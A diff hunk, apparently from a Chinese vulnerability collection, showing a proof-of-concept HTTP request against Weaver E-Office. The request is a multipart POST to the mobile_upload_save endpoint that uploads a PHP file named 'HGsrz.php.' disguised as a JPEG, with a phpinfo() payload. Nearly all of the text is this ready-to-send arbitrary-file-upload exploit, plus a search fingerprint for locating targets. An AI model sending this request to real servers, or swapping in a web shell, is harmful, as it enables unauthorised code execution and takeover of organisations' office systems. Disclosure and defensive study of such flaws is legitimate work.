@@ -36,29 +36,29 @@ app="泛微-EOffice"
   
 漏洞数据包：  
 ```
-POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
-Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d1e
-Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67J8J80DciAxUz5y; ecology_JSessionid=abcLQ67J8J80DciAxUz5y
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
-Accept-Encoding: gzip, deflate
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: null
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Host: 127.0.0.1
-Content-Length: 334
-Expect: 100-continue
-Connection: close
+POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
+Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d1e
+Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67J8J80DciAxUz5y; ecology_JSessionid=abcLQ67J8J80DciAxUz5y
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Accept-Encoding: gzip, deflate
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Host: 127.0.0.1
+Content-Length: 334
+Expect: 100-continue
+Connection: close
 
 --c2307d1cd1165cfacd8cd7c008f44d1e
-Content-Disposition: form-data; name="upload_quwan"; filename="HGsrz.php."
-Content-Type: image/jpeg
+Content-Disposition: form-data; name="upload_quwan"; filename="HGsrz.php."
+Content-Type: image/jpeg
 
-<?php phpinfo();?>
+<?php phpinfo();?>
 --c2307d1cd1165cfacd8cd7c008f44d1e
-Content-Disposition: form-data; name="file"; filename=""
-Content-Type: application/octet-stream
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
 
 
 --c2307d1cd1165cfacd8cd7c008f44d1e--
